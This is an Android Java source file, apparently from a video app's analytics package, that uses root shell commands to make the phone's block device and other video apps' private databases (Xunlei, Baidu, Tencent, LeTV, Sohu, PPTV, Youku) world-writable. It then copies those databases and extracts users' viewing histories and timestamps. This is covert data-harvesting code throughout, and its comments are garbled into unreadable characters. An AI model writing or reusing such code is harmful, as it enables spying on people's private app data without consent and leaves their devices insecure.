package tv.pps.bi.proto.biz;

import tv.pps.bi.utils.Utils;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.widget.Toast;


/**
 * 
 * @author jiangqingqing
 * @deprecated  
 */
public class VideoPlayerInfoService {

	public boolean getXunleiRoot(Context context) {// ��ȡѸ�����ݿ�Ȩ��
		String thirdpartyDBName = "kankan.db";
		String thirdpartyDBPath = "/data/data/com.xunlei.kankan/databases/kankan.db";
		return getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath);
	}

	public String getXunleiData(Context context) {// ��ȡѸ������
		String databaseFilename = context.getFilesDir() + "/kankan.db";
		StringBuilder sb = new StringBuilder();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("play_records", null, null, null, null, null, null);
		int count = 0;
		while (c.moveToNext()) {
			count++;
			sb.append(count + "--" + c.getString(c.getColumnIndex("name"))
					+ "--");
			long time = Long.parseLong(c.getString(c
					.getColumnIndex("updated_at")));
			String timeStr = Utils.formatTimeStamp(time, "yyyyMMddhhmmss");
			sb.append(timeStr + "\n");
		}
		return sb.toString();
	}
	public boolean getBaiduRoot(Context context) {//��ȡ�ٶ����ݿ�Ȩ��
		String thirdpartyDBName = "bdplayer_database";
		String thirdpartyDBPath = "/data/data/com.baidu.video/databases/bdplayer_database";
		return getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath);
	}

	public String getBaiduData(Context context) {// ��ȡ�ٶ�����
		String databaseFilename = context.getFilesDir() + "/bdplayer_database";
		StringBuilder sb = new StringBuilder();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db
				.query("album", null, null, null, null, null, null);
		int count = 0;
		while (c.moveToNext()) {
			count++;
			sb.append(count + "--"
					+ c.getString(c.getColumnIndex("current_name")) + "    ");
			long time = Long.parseLong(c.getString(c
					.getColumnIndex("visit_tick")));
			String timeStr = Utils.formatTimeStamp(time, "yyyyMMddhhmmss");
			sb.append(timeStr + "\n");
		}
		return sb.toString();
	}
	
	
	
	public boolean getQQRoot(Context context) {//��ȡ��Ѷ���ݿ�Ȩ��
		String thirdpartyDBName = "qqlivedatabase";
		String thirdpartyDBPath = "/data/data/com.tencent.qqlive/databases/qqlivedatabase";
		return getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath);
	}

	public String getQQData(Context context) {// ��ȡ��Ѷ����
		String databaseFilename = context.getFilesDir() + "/qqlivedatabase";
		StringBuilder sb = new StringBuilder();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db
				.query("history_table", null, null, null, null, null, null);
		int count = 0;
		while (c.moveToNext()) {
			count++;
			sb.append(count + "--"
					+ c.getString(c.getColumnIndex("videotitle")) + "    ");
			long time = Long.parseLong(c.getString(c
					.getColumnIndex("playTimeStamp")));
			String timeStr = Utils.formatTimeStamp(time, "yyyyMMddhhmmss");
			sb.append(timeStr + "\n");
		}
		return sb.toString();
	}

	public boolean getLeTVRoot(Context context) {// ��ȡletv���ݿ�Ȩ��
		String thirdpartyDBName = "dbletv.db";
		String thirdpartyDBPath = "/data/data/com.letv.android.client/databases/dbletv.db";
		return getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath);
	}

	public String getLeTVData(Context context) {// ��ȡletv����
		String databaseFilename = context.getFilesDir() + "/dbletv.db";
		StringBuilder sb = new StringBuilder();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("playtable", null, null, null, null, null, null);
		int count = 0;
		while (c.moveToNext()) {
			count++;
			sb.append(count + "--" + c.getString(c.getColumnIndex("title"))
					+ "--");
			long time = Long.parseLong(c.getString(c.getColumnIndex("utime"))) * 1000;
			String timeStr = Utils.formatTimeStamp(time, "yyyyMMddhhmmss");
			sb.append(timeStr + "\n");
		}
		return sb.toString();
	}

	public boolean getSohuRoot(Context context) {// ��ȡsohu���ݿ�Ȩ��
		String thirdpartyDBName = "sohutv.db";
		String thirdpartyDBPath = "/data/data/com.sohu.sohuvideo/files/databases/sohutv.db";
		return getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath);
	}

	public String getSohuData(Context context) {// ��ȡsohu����
		String databaseFilename = context.getFilesDir() + "/sohutv.db";
		StringBuilder sb = new StringBuilder();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("sohu_video_history", null, null, null, null, null,
				null);
		int count = 0;
		while (c.moveToNext()) {
			count++;
			sb.append(count + "--"
					+ c.getString(c.getColumnIndex("videoTitle")) + "--");
			String timeStr = c.getString(c.getColumnIndex("lastWatchTime"))
					.replace("-", "").replace(":", "").replace(" ", "");
			sb.append(timeStr + "\n");
		}
		return sb.toString();
	}

	public boolean getPPTVRoot(Context context) {// ��ȡPPTV���ݿ�Ȩ��
		String thirdpartyDBName = "pptv.db";
		String thirdpartyDBPath = "/data/data/com.pplive.androidphone/databases/pptv.db";
		return getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath);
	}

	public String getPPTVData(Context context) {// ��ȡpptv����
		String databaseFilename = context.getFilesDir() + "/pptv.db";
		StringBuilder sb = new StringBuilder();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("HistoryRecord_Played", null, null, null, null,
				null, null);
		int count = 0;
		while (c.moveToNext()) {
			count++;
			sb.append(count + "--"
					+ c.getString(c.getColumnIndex("videotitle")) + "--");
			long time = Long.parseLong(c.getString(c
					.getColumnIndex("modifytime")));
			String timeStr = Utils.formatTimeStamp(time, "yyyyMMddhhmmss");
			sb.append(timeStr + "\n");
		}
		return sb.toString();
	}

	public boolean getYoukuRoot(Context context) {// ��ȡ�ſ����ݿ�Ȩ��
		String thirdpartyDBName = "youku.db";
		String thirdpartyDBPath = "/data/data/com.youku.phone/databases/youku.db";
		return getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath);
	}

	public String getYoukuData(Context context) {// ��ȡ�ſ�����
		String databaseFilename = context.getFilesDir() + "/youku.db";
		StringBuilder sb = new StringBuilder();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("play_history", null, null, null, null, null, null);
		int count = 0;
		while (c.moveToNext()) {
			count++;
			sb.append(count + "--" + c.getString(c.getColumnIndex("title"))
					+ "    ");
			long time = Long.parseLong(c.getString(c
					.getColumnIndex("lastPlayTime"))) * 1000;// �ſ��������ʱ��
			String timeStr = Utils.formatTimeStamp(time, "yyyyMMddhhmmss");
			sb.append(timeStr + "\n");
		}
		return sb.toString();
	}

	public boolean getVideoPackageRoot(Context context,
			String thirdpartyDBName, String thirdpartyDBPath, String myName) {
		// �޸����ݿ����Լ����µ�����
		String dbname = thirdpartyDBName;
		String rootCmd = "chmod 777 /dev/block/mmcblk0";// ����rootȨ��
		String fromDB = thirdpartyDBPath;
		String toMyDB = context.getFilesDir().toString() + "/" + myName;
		String modifyCmd = "chmod 777 " + fromDB;
		String copyCmd = "cat " + fromDB + "  > " + toMyDB;
		if (Utils.execRootCmd(rootCmd)) {
			Toast.makeText(context, "root�ɹ�", 1).show();
			if (Utils.execRootCmd(modifyCmd)) {
				Toast.makeText(context, "�޸�" + dbname + "��дȨ�޳ɹ�", 1).show();
				if (Utils.execRootCmd(copyCmd))
					Toast.makeText(context,
							"����" + dbname + "��" + toMyDB + "�ɹ�", 1).show();
				else {
					Toast.makeText(context,
							"����" + dbname + "��" + toMyDB + "ʧ��", 1).show();
					return false;
				}
			} else {
				Toast.makeText(context, "�޸�" + dbname + "��дȨ��ʧ��", 1).show();
				return false;
			}
		} else {
			Toast.makeText(context, "rootʧ��", 1).show();
			return false;
		}
		return true;
	}

	public boolean getVideoPackageRoot(Context context,
			String thirdpartyDBName, String thirdpartyDBPath) {
		// ���޸����ݿ����Լ������µ�����
		String dbname = thirdpartyDBName;
		String rootCmd = "chmod 777 /dev/block/mmcblk0";// ����rootȨ��
		String fromDB = thirdpartyDBPath;
		String toMyDB = context.getFilesDir().toString() + "/"
				+ thirdpartyDBName;
		String modifyCmd = "chmod 777 " + fromDB;
		String copyCmd = "cat " + fromDB + "  > " + toMyDB;
		if (Utils.execRootCmd(rootCmd)) {
			Toast.makeText(context, "root�ɹ�", 1).show();
			if (Utils.execRootCmd(modifyCmd)) {
				Toast.makeText(context, "�޸�" + dbname + "��дȨ�޳ɹ�", 1).show();
				if (Utils.execRootCmd(copyCmd))
					Toast.makeText(context,
							"����" + dbname + "��" + toMyDB + "�ɹ�", 1).show();
				else {
					Toast.makeText(context,
							"����" + dbname + "��" + toMyDB + "ʧ��", 1).show();
					return false;
				}
			} else {
				Toast.makeText(context, "�޸�" + dbname + "��дȨ��ʧ��", 1).show();
				return false;
			}
		} else {
			Toast.makeText(context, "rootʧ��", 1).show();
			return false;
		}
		return true;
	}

}
